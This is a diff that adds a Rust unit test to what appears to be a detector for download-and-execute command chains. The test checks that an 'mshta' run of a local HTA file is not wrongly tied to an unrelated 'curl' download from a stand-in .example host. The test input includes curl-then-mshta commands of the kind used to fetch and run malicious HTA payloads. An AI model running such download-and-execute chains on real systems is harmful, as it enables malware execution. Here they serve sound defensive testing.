@@ -12635,6 +12635,28 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn mshta_current_dir_nested_hta_does_not_use_unrelated_basename_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o D:\Other\payload.hta https://mshta-current-dir-wrong-basename.example/payload.hta"#,
+            &mut env,
+        );
+        interpret_line(r"mshta .\Temp\payload.hta", &mut env);
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r"mshta .\Temp\payload.hta"
+                            && url == "https://mshta-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "mshta current-dir nested HTA reused unrelated basename download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn mshta_local_hta_content_queues_script_block() {
         let mut env = Environment::new(&Config::default());
         let hta = br#"<html><script language="JScript">
